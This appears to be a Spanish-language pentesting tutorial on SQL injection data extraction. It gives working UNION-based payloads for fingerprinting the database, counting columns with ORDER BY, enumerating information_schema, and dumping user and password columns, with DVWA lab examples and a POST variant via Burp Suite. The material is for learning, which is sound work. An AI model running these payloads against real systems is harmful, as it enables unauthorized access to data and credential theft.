---
description: Extrayendo información despues de obtener acceso a la base de datos.
---

# EXTRACCIÓN DE INFORMACIÓN.

## **DETECTANDO GESTOR DE BASE DE DATOS**

**1.** Utilizar herramientas como **NMAP** o similares

* Puerto 3306 MySQL por defecto

&#x20;**2.** Utilizar **TABLA DE CONCATENACION:**

|  GESTOR     |  'a' \|\| 'b' |  'a' + 'b' |  concat('a','b') |
| ----------- | ------------- | ---------- | ---------------- |
|  Oracle     |  'ab'         |  ERROR     |  'ab'            |
|  PostgreSQL |  'ab'         |  ERROR     |  ERROR           |
|  MySQL      |  0            |  'ab'      |  'ab'            |
|  SQL Server |  ERROR        |  'ab'      |  ERROR           |

&#x20;Si introduce como input alguna de las siguientes concatenaciones, sabrá que GESTOR es mas posible que sea en funcion del resultado obtenido.

&#x20;Tambien puede utilizar:

&#x20;`@@Version` → Para MySQL y MsSQL\
&#x20;`Version()` → PostgreSQL y MySQL\
&#x20;`banner FROM v$version` → Oracle

## **DETERMINANDO CANTIDAD DE COLUMNAS**

&#x20;El metodo variara en caso de que la inyeccion sea **Integer** o **String**:

### &#x20;**1. INTEGER**

&#x20;Primero debo comprobar que la web es vulnerable a SQL Injection.

&#x20;En este caso, utilizo `-1` en vez de (') por ser inyección de integer.

&#x20;Despues utilizo **`-1 ORDER BY 5 -- -`** Para ordenar las columnas de 5 en 5.

&#x20;Continuo con **`-1 ORDER BY 10 -- -`** Y resulta que me da error al no encontrar la columna numero 10.

&#x20;Intento con **`-1 ORDER BY 8 -- -`** Y no me da error.

&#x20;En cambio con **`-1 ORDER BY 9 -- -`** Si que da error.

&#x20;Por lo tanto, el numero de columnas es exactamente 8.

&#x20;Por ultimo, para comprobar hago **`-1 UNION SELECT 1,2,3,4,5,6,7,8 -- -`** Y no me da ningun error.

### &#x20;**2. CADENA**

&#x20;Primero debo comprobar con (') que la web es vulnerable a SQL Injection.

&#x20;Despues utilizo **`' ORDER BY 5 -- -`** Para ordenar las columnas de 5 en 5.

&#x20;Continuo con **`' ORDER BY 10 -- -`** Y resulta que me da error al no encontrar la columna numero 10.

&#x20;Intento con **`' ORDER BY 8 -- -`** Y no me da error.

&#x20;En cambio con **`' ORDER BY 9 -- -`** Si que da error.

&#x20;Por lo tanto, el numero de columnas es exactamente 8.

&#x20;Por ultimo, para comprobar hago **`' UNION SELECT 1,2,3,4,5,6,7,8 -- -`** Y no me da ningun error.

## &#x20;**DETERMINANDO NOMBRE DE LA BASE DE DATOS / TABLAS / COLUMNAS**

&#x20;**1.** Lo primero como ya hemos visto es comprobar que es vulnerable **(')**

&#x20;**2.** Despues compruebo el numero de columnas con **`ORDER BY`** como en el punto anterior.

&#x20;**3.** Utilizo **`' UNION SELECT 1,2 -- -`** para comprobar y si no me da error, esta correcto.

&#x20;**4**. Ahora puedo cambiar 1 y 2 por otro tipo de informaciones sacadas de la tabla:

&#x20;**`' UNION SELECT @@version,2 -- -`** → muestra la version donde deberia estar el valor de 1.

&#x20;**`' UNION SELECT table_schema,2 FROM information_schema.schemata -- -`** → muestra los nombres de las bases de datos.

&#x20;**`' UNION SELECT table_schema,table_name FROM information_schema.tables -- -`** → muestra el nombre de las tablas y a que Base de datos pertenece.

&#x20;**`' UNION SELECT table_name,column_name FROM information_schema.columns -- -`** → muestra el nombre de las tablas y las columnas que le pertenecen.

## &#x20;**FILTRANDO DATOS DE SALIDA PARA OPTIMIZAR**

&#x20;Ya sabemos como extraer mucha informacion de la base de datos, pero, en ocasiones, se da el caso de que la web solo nos ofrece una pieza de informacion. O por el contrario, nos ofrece toda la informacion posible. Es por eso que tengo que saber como filtrar la informacion.

&#x20;**1.** Compruebo que base de datos quiero atacar.

&#x20;**`' UNION SELECT table_schema,2 FROM information_schema.tables -- -`**

&#x20;Asi obtengo los nombres de las bases de datos y elijo la que yo quiero atacar.

&#x20;**2.** Ahora, para obtener las tablas de esta base de datos tengo que filtrar:

&#x20;**`‘ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=’dvwa' -- -`**

&#x20;Ahora solo veo las tablas de la Base de datos “dvwa” por lo que puedo elegir la tabla que quiero atacar.

&#x20;**3.** Seguimos para obtener las columnas de la tabla “users”

&#x20;**`‘ UNION SELECT column_name,2 FROM information_schema.columns WHERE table_schema=’dvwa' AND table_name='users' -- -`**

&#x20;Ya obtengo las columnas dentro de la tabla users de la base de datos dvwa. Ya solo queda sacar la informacion de las columnas.

&#x20;Si solo puedo ver un dato al mismo tiempo, debo empezar a concatenar AND y != para ir navegando por cada una de las Bases de Datos, Luego tablas, luego columnas y por ultimo datos.

&#x20;**`' UNION SELECT table_schema,2 FROM information_schema.tables WHERE table_schema!=dvwa AND table_schema!=fonts -- -`**

&#x20;Asi, filtrando poco a poco vamos obteniendo la informacion que queremos.

## &#x20;**EXTRAER TODOS LOS DATOS DE UNA BASE DE DATOS**

&#x20;Ya hemos conseguido alcanzar la COLUMNA de la TABLA de la BASE DE DATOS que nos interesa. Ahora necesitamos sacar la informacion de esta columna:

&#x20;**`' UNION SELECT user,password FROM users -- -`**

&#x20;Como ya sabemos la tabla de la que queremos sacar la informacion, no hace falta nada mas.

## &#x20;**EXTRAER INFORMACION CON METODO POST**

&#x20;En todos los casos anteriores hemos utilizado el metodo **GET**, es decir, modificando el URL.

&#x20;El metodo **POST** no me permite mostrar ni modificar los datos en el URL,

&#x20;Para hacer las consultas con el metodo **POST** necesito una herramienta como **BURP SUITE** para modificar la solicitud **POST** en caliente antes de la transmision.

&#x20;El procedimiento para obtener la informacion seria el mismo.
